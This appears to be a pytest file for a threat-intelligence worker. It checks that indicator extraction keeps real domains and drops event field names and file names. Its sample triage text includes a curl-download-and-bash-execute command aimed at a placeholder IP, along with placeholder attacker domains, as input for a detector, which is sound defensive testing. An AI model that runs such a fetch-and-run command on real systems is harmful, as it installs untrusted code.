# tests/worker/test_ioc_domains.py
"""What counts as a domain when indicators are picked out of text.

IoC extraction used to take any "word.word": event field names (event.action,
event.category, user.name, process.pid), file names (install.sh, exploit.py)
and path parts landed in Threat IoCs, were sent to TI providers and offered to
the web block. worker/web_domains.plausible_domain decides now."""
import json
import os
from datetime import datetime, timezone

import httpx
import pytest

from worker import alert_iocs, es_client, redis_client, ti_lookup
from worker.case_grouping import parse_exclusions
from worker.ti.extractor import extract_iocs
from worker.web_domains import ICANN_TLDS, plausible_domain

ROOT = os.path.join(os.path.dirname(__file__), "../..")
META = alert_iocs.AlertMeta(alert_id="a1", group_id="blue", severity="high", hostname="h1", agent_id="ag1",
                            rule_title="DNS", created_at=datetime(2026, 11, 23, tzinfo=timezone.utc))
EXCL = parse_exclusions("")

# what an alert's triage text looks like: its event fields, a command line, a note
TRIAGE_TEXT = r"""Alert: Suspicious DNS query
event.action: dns_query
event.category: network
event.id: 4242
user.name: alice
host.name: web-01
process.name: curl
process.pid: 4242
process.parent.pid: 1
winlog.channel: Security
file.directory: /var/www
dns.question.name: login-bca-verifikasi.xyz
cmd: curl -s http://203.0.113.9/x.sh -o /tmp/install.sh && bash /tmp/install.sh; python3 exploit.py
note: also seen evil-c2.top, //cdn.badcdn.net/x.js, \\files.attacker.com\share and abcdefghij.onion
file: C:\Users\a\Downloads\update.zip
"""


def test_tld_list_matches_the_public_suffix_list():
    """web_domains embeds the ICANN TLDs (server-api copies only that file). When
    the PSL asset is updated, regenerate ICANN_TLDS from it."""
    path = os.path.join(ROOT, "worker/worker/phishing/assets/public_suffix_list.dat")
    icann = open(path, encoding="utf-8").read().split("===END ICANN DOMAINS===")[0]
    tlds = set()
    for line in icann.splitlines():
        line = line.strip()
        if line and not line.startswith("//"):
            tlds.add(line.split(".")[-1].lstrip("*!").lower().encode("idna").decode("ascii"))
    assert ICANN_TLDS == tlds


@pytest.mark.parametrize("value", [
    "event.action", "event.category", "event.id", "user.name", "host.name", "process.name", "process.pid",
    "process.parent.pid", "dns.question.name", "winlog.channel", "file.directory", "group.id", "rule.name",
    "email.to", "registry.data", "agent.events",
    "printer.local", "box.lan", "a.b", "foo.notatld", "x.exe", "localhost",
])
def test_not_domains(value):
    assert not plausible_domain(value) and not plausible_domain(value, free_text=True)


@pytest.mark.parametrize("value", [
    "google.com", "login-bca-verifikasi.xyz", "bca.co.id", "evil-c2.top", "x.web.app", "file.io", "user.email.com",
    "münchen.de", "xn--mnchen-3ya.de", "abcdefghij.onion", "c2.bazar", "evil.example", "Evil.Example.COM.",
])
def test_domains(value):
    assert plausible_domain(value) and plausible_domain(value, free_text=True)


@pytest.mark.parametrize("value", ["install.sh", "exploit.py", "README.md", "main.cf", "update.zip", "libc.so"])
def test_file_names_in_text_are_files_but_a_domain_field_keeps_them(value):
    assert not plausible_domain(value, free_text=True)
    assert plausible_domain(value)  # a DNS query for evil.zip is a domain


def test_triage_text_yields_only_real_domains():
    found = {(i.type.value, i.value.lower()) for i in extract_iocs(TRIAGE_TEXT) if i.type.value in ("domain", "url")}
    assert found == {
        ("domain", "login-bca-verifikasi.xyz"), ("domain", "evil-c2.top"), ("domain", "cdn.badcdn.net"),
        ("domain", "files.attacker.com"), ("domain", "abcdefghij.onion"), ("url", "http://203.0.113.9/x.sh"),
    }


def test_threat_iocs_drop_extracted_non_domains_but_keep_domain_fields():
    extracted = [{"type": "domain", "value": v} for v in ("event.action", "user.name", "process.pid", "c2.example")]
    fields = {"dns.question.name": "dc01.corp.lan", "destination.domain": "c2.bazar"}
    docs = alert_iocs.collect(META, None, fields, extracted, EXCL)
    assert {(d["type"], d["value"], d["origin"]) for _, d in docs} == {
        ("domain", "c2.example", "ti"),
        ("domain", "dc01.corp.lan", "event"),  # a domain field keeps what the event had
        ("domain", "c2.bazar", "event"),
    }


@pytest.mark.parametrize("value", ["event.action", "user.name", "process.pid"])
def test_ti_lookup_refuses_field_names(value):
    with pytest.raises(ValueError):
        ti_lookup.check_value(value)


@pytest.mark.parametrize("value,origin,bad", [
    ("event.action", "ti", True), ("user.name", "alert", True), ("install.sh", "ti", True),
    ("install.sh", "alert", False),  # a case indicator came from a domain field
    ("event.action", "event", False),  # never touched
    ("evil-c2.top", "ti", False),
])
def test_what_the_one_time_purge_removes(value, origin, bad):
    assert alert_iocs.implausible(value, origin) is bad


class _Redis:
    def __init__(self):
        self.kv = {}

    async def get(self, key):
        return self.kv.get(key)

    async def set(self, key, value):
        self.kv[key] = value


async def test_purge_deletes_stored_non_domains_once(monkeypatch):
    calls = []
    pages = [
        {"buckets": [{"key": {"value": "event.action", "origin": "ti"}},
                     {"key": {"value": "evil-c2.top", "origin": "ti"}}], "after_key": {"value": "evil-c2.top"}},
        {"buckets": [{"key": {"value": "install.sh", "origin": "ti"}},
                     {"key": {"value": "install.sh", "origin": "alert"}}]},
    ]

    def handler(request):
        body = json.loads(request.content)
        calls.append((request.url.path, body))
        if request.url.path.endswith("/_search"):
            return httpx.Response(200, json={"aggregations": {"v": pages.pop(0) if pages else {"buckets": []}}})
        return httpx.Response(200, json={"deleted": 1})

    monkeypatch.setattr(es_client, "_client",
                        httpx.AsyncClient(transport=httpx.MockTransport(handler), base_url="http://es"))
    redis = _Redis()

    async def get_redis():
        return redis

    monkeypatch.setattr(redis_client, "get_redis", get_redis)
    assert await alert_iocs.purge_implausible_domains() == 2
    search = calls[0][1]
    assert search["query"]["bool"]["must_not"] == [{"term": {"origin": "event"}}]
    [delete] = [b for p, b in calls if p.endswith("/_delete_by_query")]
    removed = {(c["bool"]["filter"][0]["term"]["value"], c["bool"]["filter"][1]["term"]["origin"])
               for c in delete["query"]["bool"]["should"]}
    assert removed == {("event.action", "ti"), ("install.sh", "ti")}
    calls.clear()
    assert await alert_iocs.purge_implausible_domains() == 0 and calls == []  # once
